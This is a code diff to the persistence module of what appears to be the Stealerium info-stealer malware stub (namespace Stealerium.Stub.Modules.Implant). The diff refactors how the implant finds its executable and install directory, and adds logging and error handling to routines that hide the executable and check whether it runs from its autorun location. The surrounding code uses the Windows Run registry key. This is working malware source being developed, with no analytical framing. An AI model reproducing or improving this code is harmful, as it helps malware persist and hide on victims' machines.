@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using Microsoft.Win32;
 using Stealerium.Stub.Helpers;
@@ -8,11 +8,90 @@ namespace Stealerium.Stub.Modules.Implant
     internal sealed class Startup
     {
         // Install
-        private static readonly string ExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        private static readonly string InstallDirectory = Paths.InitWorkDir();
+        private static string _executablePath;
+        private static string _installDirectory;
+        private static string _installFile;
+        private static bool _initialized;
+        private static readonly object _lock = new object();
 
-        private static readonly string InstallFile = Path.Combine(
-            InstallDirectory, new FileInfo(ExecutablePath).Name);
+        private static void EnsureInitialized()
+        {
+            if (_initialized) return;
+            
+            lock (_lock)
+            {
+                if (_initialized) return;
+                
+                try
+                {
+                    Logging.Log("Startup: Initializing...");
+                    
+                    try
+                    {
+                        var process = System.Diagnostics.Process.GetCurrentProcess();
+                        Logging.Log($"Startup: Got current process: {process.Id}");
+                        
+                        var mainModule = process.MainModule;
+                        if (mainModule == null)
+                        {
+                            Logging.Log("Startup: MainModule is null!");
+                            throw new InvalidOperationException("MainModule is null");
+                        }
+                        
+                        _executablePath = mainModule.FileName;
+                        Logging.Log($"Startup: Got ExecutablePath = {_executablePath}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Logging.Log($"Startup: Error getting MainModule: {ex.Message}\nStack trace: {ex.StackTrace}");
+                        // Fallback to Assembly location
+                        _executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                        Logging.Log($"Startup: Using fallback ExecutablePath = {_executablePath}");
+                    }
+
+                    _installDirectory = Paths.InitWorkDir(Config.Mutex);
+                    Logging.Log($"Startup: Got InstallDirectory = {_installDirectory}");
+
+                    _installFile = Path.Combine(_installDirectory, new FileInfo(_executablePath).Name);
+                    Logging.Log($"Startup: Got InstallFile = {_installFile}");
+
+                    _initialized = true;
+                    Logging.Log("Startup: Initialization complete");
+                }
+                catch (Exception ex)
+                {
+                    Logging.Log($"Startup: Fatal error during initialization: {ex.Message}\nStack trace: {ex.StackTrace}");
+                    throw;
+                }
+            }
+        }
+
+        private static string ExecutablePath
+        {
+            get
+            {
+                EnsureInitialized();
+                return _executablePath;
+            }
+        }
+
+        private static string InstallDirectory
+        {
+            get
+            {
+                EnsureInitialized();
+                return _installDirectory;
+            }
+        }
+
+        private static string InstallFile
+        {
+            get
+            {
+                EnsureInitialized();
+                return _installFile;
+            }
+        }
 
         // Autorun
         private const string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -82,9 +161,29 @@ namespace Stealerium.Stub.Modules.Implant
         // Hide executable
         public static void HideFile(string path = null)
         {
-            var filename = path ?? ExecutablePath;
-            Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
-            new FileInfo(filename).Attributes |= FileAttributes.Hidden;
+            try
+            {
+                var filename = path ?? ExecutablePath;
+                Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
+                
+                var fileInfo = new FileInfo(filename);
+                if (!fileInfo.Exists)
+                {
+                    Logging.Log($"HideFile : File does not exist: {filename}");
+                    return;
+                }
+
+                var currentAttributes = fileInfo.Attributes;
+                Logging.Log($"HideFile : Current file attributes: {currentAttributes}");
+                
+                fileInfo.Attributes |= FileAttributes.Hidden;
+                Logging.Log("HideFile : Hidden attribute added successfully");
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"HideFile : Error setting hidden attribute: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw; // Re-throw to ensure the error is propagated
+            }
         }
 
         // Check if the app is installed to autorun
@@ -162,7 +261,18 @@ namespace Stealerium.Stub.Modules.Implant
         // Check if the executable is running from the startup directory
         public static bool IsFromStartup()
         {
-            return ExecutablePath.StartsWith(InstallDirectory);
+            try
+            {
+                Logging.Log($"IsFromStartup: Checking if {ExecutablePath} starts with {InstallDirectory}");
+                var result = ExecutablePath.StartsWith(InstallDirectory);
+                Logging.Log($"IsFromStartup: Result = {result}");
+                return result;
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"IsFromStartup: Error checking startup location: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw;
+            }
         }
     }
 }
